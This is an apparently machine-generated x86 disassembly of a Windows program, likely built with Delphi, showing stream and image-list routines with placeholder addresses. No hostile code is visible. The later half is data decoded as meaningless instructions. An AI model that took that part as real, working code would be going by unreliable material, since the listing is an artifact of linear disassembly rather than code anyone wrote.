mov al 0x1
pop esi
pop ebx
retn
sub_44ad9c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov edi edx
mov esi eax
test edi edi
je r-xdata
mov [ ebp - 0x1 ] 0x0
jmp r-xdata
mov eax esi
call sub_44a350
mov ebx eax
mov eax edi
call sub_44a350
cmp ebx eax
je r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax esi
call sub_44a350
test eax eax
jne r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403228
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_44ae78
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x8 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x3c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_403228
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_44ae5b
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0xc ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x3c ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_44ad58
mov [ ebp - 0x1 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44ae62
mov eax [ ebp - 0xc ]
call sub_403258
retn
mov eax edi
call sub_44a350
test eax eax
jne r-xdata
mov [ ebp - 0x1 ] 0x1
jmp r-xdata
sub_44ae8c
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_44a350
test eax eax
setg al
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ebx [ eax + 0x20 ]
mov eax ebx
mov edx [ r-xdata ]
call sub_4033e4
test al al
je r-xdata
mov al 0x1
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov edx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_44ad9c
test al al
je r-xdata
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn
sub_44aee8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_419da4
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x38 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x3c ]
push eax
push ebp
call sub_44ae8c
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x8 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_44af40
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
lea edx [ ebp - 0x18 ]
mov ecx 0x4
mov eax ebx
call sub_415dc8
lea edx [ ebp - 0x1c ]
mov ecx 0x4
mov eax ebx
call sub_415dc8
mov dl 0x1
mov eax [ r-xdata ]
call sub_421eac
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_44b1c4
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_415b9c
mov esi eax
mov edx ebx
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov eax [ ebp - 0x18 ]
add eax esi
cdq
push edx
push eax
mov eax ebx
call sub_415bbc
mov dl 0x1
mov eax [ r-xdata ]
call sub_421eac
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_44b1a7
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_421eac
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_421eac
mov [ ebp - 0x14 ] eax
mov dl 0x1
mov eax [ ebp - 0x14 ]
call sub_423244
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x34 ]
xor edx edx
xor eax eax
call sub_412b10
mov eax [ ebp - 0x4 ]
call sub_44b56c
xor eax eax
push ebp
push sub_44b18a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x30 ]
cdq
idiv ecx
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44b191
mov eax [ ebp - 0xc ]
call sub_403258
mov eax [ ebp - 0x14 ]
call sub_403258
mov eax [ ebp - 0x4 ]
call sub_44b570
retn
inc eax
mov [ ebp - 0x20 ] eax
xor edi edi
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x34 ]
cdq
idiv ecx
mov esi eax
dec esi
test esi esi
jl r-xdata
inc edi
dec [ ebp - 0x20 ]
jne r-xdata
inc esi
xor ebx ebx
cmp [ ebp - 0x1c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x34 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
imul edx edi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
imul eax ebx
call sub_412b38
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp - 0x8 ]
call sub_422474
push eax
mov eax [ ebp - 0xc ]
call sub_422474
lea edx [ ebp - 0x30 ]
pop ecx
call sub_41d854
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x34 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
imul edx edi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
imul eax ebx
call sub_412b38
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp - 0x10 ]
call sub_422474
push eax
mov eax [ ebp - 0x14 ]
call sub_422474
lea edx [ ebp - 0x30 ]
pop ecx
call sub_41d854
mov ecx [ ebp - 0x14 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_44a168
dec [ ebp - 0x1c ]
inc ebx
dec esi
jne r-xdata
cmp [ ebp - 0x1c ] 0x0
je r-xdata
sub_44b1d4
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
push 0x0
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_41a524
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_44b234
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
test eax eax
je r-xdata
push eax
call ImageList_Read
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_449ff0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44b23b
mov eax [ ebp - 0xc ]
call sub_403258
retn
sub eax 0xffffffec
sub_44b23b
mov eax [ ebp - 0x4 ]
call sub_449e58
test al al
jne r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor ebx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_403228
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_44b36a
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
call sub_415bbc
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x10 ]
call sub_4162c4
push 0x0
push 0x12
mov eax [ ebp - 0x10 ]
call sub_415bbc
lea edx [ ebp - 0x11 ]
mov ecx 0x1
mov eax [ ebp - 0x10 ]
mov esi [ eax ]
call [ esi + 0xc ]
dec eax
jne r-xdata
test bl bl
je r-xdata
cmp [ ebp - 0x11 ] 0x1
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
call sub_403258
retn
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
call sub_415bbc
push 0x0
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_41a524
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_44b34d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
test eax eax
je r-xdata
push 0x0
push 0x38
mov eax [ ebp - 0x10 ]
call sub_415bbc
lea edx [ ebp - 0x12 ]
mov ecx 0x1
mov eax [ ebp - 0x10 ]
mov esi [ eax ]
call [ esi + 0xc ]
dec eax
jne r-xdata
push eax
call ImageList_Read
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_449ff0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_403258
retn
sub eax 0xffffffec
mov al [ ebp - 0x12 ]
or [ ebp - 0x11 ] al
push 0x0
push 0x12
mov eax [ ebp - 0x10 ]
call sub_415bbc
lea edx [ ebp - 0x11 ]
mov ecx 0x1
mov eax [ ebp - 0x10 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
dec eax
sete bl
sub_44b39c
push ebx
push esi
push edi
add esp 0xfffffff0
mov edi edx
mov esi eax
mov eax esi
call sub_44a090
mov eax edi
call sub_415b9c
mov [ esp + 0xc ] eax
mov edx esp
mov ecx 0x4
mov eax edi
mov ebx [ eax ]
call [ ebx + 0xc ]
lea edx [ esp + 0x4 ]
mov ecx 0x4
mov eax edi
mov ebx [ eax ]
call [ ebx + 0xc ]
mov bl [ esp ]
and bl 0xff
mov ax [ esp ]
shr ax 0x8
mov [ esp + 0x8 ] al
mov eax [ esp + 0xc ]
cdq
push edx
push eax
mov eax edi
call sub_415bbc
mov eax [ esp ]
cmp eax [ esp + 0x4 ]
je r-xdata
mov edx edi
mov eax esi
call sub_44af40
cmp bl 0x49
jne r-xdata
cmp [ esp + 0x8 ] 0x4c
jne r-xdata
mov edx edi
mov eax esi
call sub_44b1d4
jmp r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
sub_44b428
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi edx
mov ebx eax
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_41a524
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_44b522
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
je r-xdata
mov eax r-xdata
call sub_40bf48
mov [ rw-data ] eax
cmp [ rw-data ] 0x60000
jb r-xdata
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
push r-xdata
call GetModuleHandleA
mov edi eax
test edi edi
je r-xdata
push eax
mov eax ebx
call sub_44a02c
push eax
call ImageList_Write
test eax eax
jne r-xdata
sub eax 0xffffffec
push eax
push 0x1
mov eax ebx
call sub_44a02c
push eax
call [ rw-data ]
test eax eax
je r-xdata
sub eax 0xffffffec
push r-xdata
push edi
call GetProcAddress
mov [ rw-data ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44b529
mov eax [ ebp - 0x4 ]
call sub_403258
retn
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b7b4
call sub_4039e4
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b7b4
call sub_4039e4
jmp r-xdata
sub_44b590
push ebx
push esi
call sub_4035e4
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403248
test bl bl
jle r-xdata
mov edx esi
call sub_44ad00
pop esi
pop ebx
retn
mov eax esi
call sub_4035cc
sub_44b5dc
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_44b601
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44b608
retn
sub_44b916
inc esp
add [ edx - 0x32dfffbf ] bh
inc esp
add al dh
mov [ 0xffffffffce680041 ] al
inc esp
add [ eax - 0x5e ] al
inc ecx
add ah dl
mov [ 0xffffffffa3280041 ] al
inc ecx
add [ ebx + ecx * 8 + 0x44 ] cl
add [ ebx + ecx * 8 - 0x344bffbc ] al
inc esp
add [ eax - 0x34 ] cl
inc esp
add ah ah

sub_44b95a
inc esp
add [ eax - 0x33 ] cl
inc esp
add [ eax - 0x33 ] ch
inc esp
add [ eax - 0x57ffbb33 ] cl
int 0x44
add [ ebx + edx * 4 ] dl
inc esp
add al cl
int 0x44
add [ ebx + edx * 4 ] bl
inc esp
add [ eax ] ah
xchg ebx eax
inc esp
add ah ah
int 0x44
add [ eax ] cl
into
inc esp
add [ eax ] ch
into
inc esp
add [ eax - 0x32 ] cl
inc esp
add [ ebx + ecx * 8 ] ah
inc esp
add [ edi ] cl
push esp
dec ebp
outsb
jne r-xdata
mov ah 0x34
inc eax
add [ eax - 0xfffbfcc ] ch
xor [ eax ] eax
or al 0x32
inc eax
add [ eax ] dl
iretd
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul ebp [ esi + 0x6b ] r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xor al 0xba
inc esp
add [ eax + 0x44ba ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi - 0x46 ] cl
inc esp
add [ edx - 0x46 ] bh
inc esp
add [ eax + eax + 0x28100000 ] ch
inc ecx
add [ ecx + 0x34ac0041 ] bl
inc eax
add al dh
0x34b40041 0x40
test al 0x34
inc eax
add al dh
sub_44ba74
inc esp
add [ ebp + ebp * 8 + 0x54090044 ] dl
dec ebp
outsb
jne r-xdata
test al 0x0
add bh bh
test al 0x0
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
je r-xdata
push es
add [ esi ] al
inc edx
inc ebx
push 0x586b6365
mov eax 0x3b0044
add bh bh
enter 0x44ff 0x0
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x2 ] al
arpl [ ebx + 0x58 ] bp
insd
mov [ edx + 0x9070044 ] bh
push esp
dec ebp
outsb
jne r-xdata
inc edx
jb r-xdata
dec eax
outsd
je r-xdata
add eax [ eax ]
or [ ecx + 0x75 ] eax
je r-xdata
add [ eax ] 0x0
add [ eax ] al
je r-xdata
outsb
jne r-xdata
imul edx [ eax + edx + 0x300040 ] 0x0
[ eax + 0x7c0044ed ]
popad
jns r-xdata
add al 0x0
or eax [ ecx + 0x75 ]
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] 0x0
add [ eax ] al
insd
in al dx
mov ecx 0x290c0044
inc ecx
add [ eax ] bl
add [ 0x756e654d ] al
jae r-xdata
push esp
adc [ eax ] al
aas
add [ eax ] al
jmp esp
insd
popad
jae r-xdata
add bh bh
test al 0xed
inc esp
add [ esi + esi * 8 + 0x44 ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43070008 ] al
popad
jo r-xdata
pop eax
mov eax 0x3c0044
add bh bh
inc esp
add [ ebp ] eax
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x2 ] al
add eax 0x75411100
je r-xdata
add [ eax ] al
add [ edx ] 0x0
push es
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
add [ eax ] dl
inc eax
add [ eax - 0x57010000 ] ch
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + ebp - 0x10d7ffbf ] bl
inc esp
add ah al
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x41060002 ] al
adc [ eax ] al
cmp al [ eax ]
add bh bh
pushad
add [ eax ] al
[ esi + ebp * 8 + 0x44 ]
imul ebp [ edi + 0x6e ] r-xdata
cmp [ eax ] al
add bh bh
sbb dh ch
inc esp
add [ esi + esi * 8 + 0x44 ] bl
add [ eax ] al
or [ eax ] eax
pop es
inc ebx
push 0x656b6365
sub [ fs : esp + eax * 2 + 0x7c00 ] bl
[ eax - 0x8 ]
outsb
add [ eax ] dl
inc eax
add [ eax ] bh
add [ eax ] al
[ eax ]
out dx al
imul esi [ ebp + ebp * 2 + 0x61 ] 0x44b66c70
add [ eax ] cl
add bh bh
cwde
in eax dx
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
pop es
add [ 0x61657242 ] al
dec esp
imul ebp [ esi + 0x65 ] 0x75646552
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
xor [ edi - 0xc63ffbf ] bh
inc esp
add [ esp + esi * 8 ] dh
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x42060006 ] al
sub_44bbcb
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x530d000a ] al
jne r-xdata
add [ eax ] al
add [ eax ] al
or eax 0x72470a00
outsd
jne r-xdata
dec ebp
outsb
jne r-xdata
adc [ eax ] al
cmp eax 0xcff0000
cmc
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc [ eax ] eax
or [ edx + 0x61 ] edx
dec ecx
outsb
js r-xdata
push esp
adc [ eax ] al
aas
add [ eax ] al
jmp esp
insd
popad
jae r-xdata
imul ebp [ fs : edi + 0x49 ] 0x946d6574
adc eax 0x600041
add bh bh
je r-xdata
inc esp
add [ edi + esi * 8 ] bh
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc al [ eax ]
or [ ebx + 0x68 ] dl
outsd
jb r-xdata
dec eax
imul ebp [ esi + 0x74 ] r-xdata
inc eax
add [ eax ] al
[ eax + 0x1c0044ef ]
test [ eax + eax ] 0xff800000
adc eax 0x540041
add bh bh
push esp
add [ eax ] al
adc [ eax ] al
cmp al [ eax ]
add bh bh
pushad
cwde
inc ebx
jne r-xdata
inc ecx
add [ ecx + 0x34ac0041 ] bl
inc eax
outsb
arpl [ ebp + 0x64 ] sp
inc esp
jb r-xdata
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f120016 ] al
outsb
inc ecx
jbe r-xdata
add [ eax ] dl
inc eax
add [ esi ] bh
add [ eax ] al
dec [ eax + 0x5c0044ef ]
test [ eax + eax ] 0x1800000
add [ eax ] al
add [ ebx ] dl
add [ edi ] al
push esi
imul esi [ ebx + 0x69 ] 0xac656c62
add al dh
0x34b40041 0x40
test al 0x34
inc eax
add al dh
xor al 0x40
ja r-xdata
add [ eax ] al
dec [ eax + 0x7cff0000 ]
test [ eax + eax ] 0x800000
add [ eax ] al
adc [ eax + eax ] 0x7
dec edi
outsb
inc ebx
insb
imul esp [ ebx + 0x6b ] r-xdata
nop
add [ eax ] al
call [ eax + 0x1ff0000 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0015 ] al
outsb
inc esp
jb r-xdata
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f070014 ] al
add [ esi - 0x42 ] bl
inc esp
add [ edx - 0x42 ] dh
inc esp
add [ eax ] bl
add [ eax ] al
adc [ eax ] ch
je r-xdata
add [ eax ] al
ja r-xdata
xor [ eax ] eax
or al 0x32
inc eax
add [ eax + 0x2 ] cl
inc ebp
add ah ah
inc ebp
inc ecx
add [ ebp + ebx * 4 + 0x45000041 ] ah
inc ecx
add [ eax + 0xa ] dh
inc ebp
add [ ebx + ecx ] cl
xor al 0x40
add [ eax - 0xfffbfcc ] ch
insd
call 0xffffffffa0450255
add [ eax ] al
jmp [ eax + 0x1ff0000 ]
add [ 0x654d6e4f ] cl
popad
jae r-xdata
je r-xdata
inc ecx
add [ esi + ebx * 4 - 0x5e43ffbf ] dl
inc ecx
add [ ecx + eax + 0xa580045 ] ch
pushfd
sahf
jb r-xdata
dec esp
mov esi 0xbe7c0044
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
insd
jo r-xdata
inc ebp
add [ esi + ebx * 4 - 0x607bffbf ] cl
inc ecx
add [ ecx - 0x6163ffbf ] dh
dec ecx
je r-xdata
adc eax 0x880041
add bh bh
mov [ eax ] al
add bh bh
jl r-xdata
lodsb [ esi ]
add [ eax ] al
inc esp
add [ eax - 0x67010000 ] bl
inc ebp
add [ edx + eax + 0xa880045 ] bl
inc ebp
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x3c0040 ] dl
add [ eax ] al
add eax [ eax ]
std
sahf
inc ecx
add [ edi + ebx * 4 - 0x5e4bffbf ] al
inc ecx
add [ esi + ebx * 4 - 0x616bffbf ] bl
inc ecx
add [ ecx + 0x1ac0041 ] bh
inc ebp
add [ eax + 0xa ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
insd
lea eax [ eax ]
adc [ esi + 0x44 ] bh
sub_44be64
out dx eax
inc [ eax - 0x57ffbafe ]
add al [ ebp ]
nop
push es
inc ebp
add [ 0x6e654d54 ] al
jne r-xdata
xor al 0x40
mov esi 0x5070044
push esp
dec ebp
outsb
jne r-xdata
add [ edi + ecx ] bh
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add eax [ eax ]
or eax [ ecx + 0x75 ]
je r-xdata
add [ eax + 0x2c0044b8 ] ah
cmovne eax [ eax ]
cmp al 0xf
add [ edx + edi * 4 + 0x340044 ] al
mov esi 0x290c0044
inc ecx
add [ ebx ] al
add [ 0x756e654d ] al
jae r-xdata
push es
add [ eax ] cl
inc edx
imul eax [ ecx + ebp * 2 + 0x4d ] 0x2865646f
pushfd
inc esp
add [ eax ] cl
add bh bh
ror [ edx ] 0x1
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x49060007 ] al
dec eax
outsd
je r-xdata
add [ edx + eax + 0xa880045 ] bl
inc ebp
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x3c0040 ] dl
add [ eax ] al
add eax [ eax ]
std
add al dh
xor [ eax ] eax
or al 0x32
inc eax
add [ eax + 0x2 ] cl
inc ebp
add ah ah
inc ebp
inc ecx
add [ ebp + ebx * 4 + 0x45000041 ] ah
inc ecx
add [ eax + 0xa ] dh
inc ebp
add [ ebx + ecx ] cl
inc ebp
add [ esi + ebx * 4 - 0x607bffbf ] cl
inc ecx
add [ ecx - 0x6163ffbf ] dh
inc ecx
add [ esi + ebx * 4 - 0x5e43ffbf ] dl
inc ecx
add [ ecx + eax + 0xa580045 ] ch
inc ebp
add [ eax + 0x10 ] cl
inc ebp
add [ edi + ecx + 0x54090045 ] cl
dec ebp
popad
imul ebp [ esi + 0x4d ] 0x8b756e65
rcl [ eax - 0x41 ] 0x44
add [ edi ] al
or [ ebp + ecx * 2 + 0x61 ] edx
imul ebp [ esi + 0x4d ] 0x4756e65
mov edi 0xbe780044
inc esp
add [ ebx ] cl
add [ 0x756e654d ] al
jae r-xdata
inc eax
add [ edi + edi * 4 ] al
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x41 ] dl
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x41 ] al
inc esp
add [ eax ] ah
add [ eax ] al
les edi [ ebp - 0x5e63ffbc ]
inc ecx
add [ esp + esi - 0x650fffc0 ] ch
inc ecx
add [ esp + esi + 0x34a80040 ] dh
inc eax
add bh bh
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add al [ eax ]
add eax 0x6d657449
jae r-xdata
test [ edx + 0x340044 ] bh
adc [ eax ] al
inc eax
add [ eax ] al
call [ ecx + ecx + 0x10045 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
or [ eax ] al
or [ edi + 0x77 ] ecx
outsb
jb r-xdata
jns r-xdata
or al [ eax ]
or [ edi + 0x6e ] cl
jb r-xdata
insd
popad
jae r-xdata
sub [ esp + eax * 2 + 0x4800 ] bl
call eax
or al [ ebp ]
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
pop es
add [ esi ] al
mov al [ 0x4c0044b8 ]
cmovne eax [ eax ]
pop esp
cmovne eax [ eax ]
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al 0x0
adc [ ecx + 0x75 ] eax
je r-xdata
sbb al 0xc1
inc esp
add [ ebx ] al
andps xmm1 [ ebp + 0x65 ]
outsb
jo r-xdata
outsb
je r-xdata
ja r-xdata
dec ecx
dec esp
imul ebp [ esi + 0x65 ] 0x75646552
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
add [ eax ] dl
inc eax
add [ eax + eax ] bl
[ edi + ecx + 0x45 ]
insd
popad
inc edx
outsd
outsb
je r-xdata
insb
imul esp [ edi + 0x6e ] 0x746e656d
add [ eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax + 0x60044c0 ] bl
jo r-xdata
add [ eax ] al
add [ eax ] al
add al [ eax ]
add [ eax ] al
cwde
rol [ eax + eax + 0x6 ] 0x70
popad
adc [ eax ] al
inc ecx
add [ eax ] al
dec eax
push cs
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
or [ eax ] eax
push cs
push eax
popad
jb r-xdata
add [ edx + esi ] cl
outsd
insd
push esp
outsd
push esp
outsd
jo r-xdata
add [ eax ] al
add [ eax + eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al 0x0
push esp
outsd
jne r-xdata
push esp
dec ebp
outsb
dec esp
je r-xdata
or [ eax + 0x61 ] dh
jo r-xdata
je r-xdata
outsb
je r-xdata
add [ edi + ecx + 0x45 ] cl
jo r-xdata
add eax 0x756e654d
jae r-xdata
insd
popad
dec esi
outsd
outsb
add eax 0x756e654d
inc eax
add [ eax - 0x1bffbaea ] ah
inc ebp
inc ecx
add [ ebp + ebx * 4 + 0x45000041 ] ah
inc ecx
add [ eax + 0xa ] dh
inc ebp
add [ ebx + ecx ] cl
inc ebp
add [ esi + ebx * 4 - 0x607bffbf ] cl
inc ecx
add [ ecx - 0x6163ffbf ] dh
inc ecx
add [ esi + ebx * 4 - 0x5e43ffbf ] dl
inc ecx
add [ esi + edx ] ch
inc ebp
add [ eax + 0xa ] bl
inc ebp
add [ edx + eax + 0xa880045 ] bl
inc ebp
add ah dl
push ss
inc ebp
add [ edi + edx + 0x540a0045 ] cl
push eax
outsd
jo r-xdata
rol [ eax + eax - 0x73 ] 0x40
add al ch
rol [ eax + eax ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp al 0xc2
outsd
xor [ eax ] eax
or al 0x32
inc eax
add [ eax - 0xfffbfcc ] ch
je r-xdata
outsd
insd
outsb
or al 0x74
bound ecx [ ebp + 0x66 ]
je r-xdata
sbb cl al
inc esp
add [ 0x654c616d ] cl
je r-xdata
jb r-xdata
imul ebp [ ebp + 0x61 ] 0x6e6f6974
jae r-xdata
inc ebx
outsb
push edx
imul esp [ edi + 0x68 ] 0x61700874
inc ebx
push 0x65676e61
nop
pushfd
rol [ eax + eax + 0x3 ] 0xf
push esp
push eax
outsd
jo r-xdata
imul eax [ ecx + ebp * 2 + 0x4d ] 0xac65646f
mov dh 0x44
add [ eax ] dl
add bh bh
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f08000a ] al
outsb
dec eax
insb
dec esp
imul ebp [ esi + 0x65 ] 0x75646552
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
add [ eax ] dl
inc eax
add [ ecx ] ah
add bh bh
popad
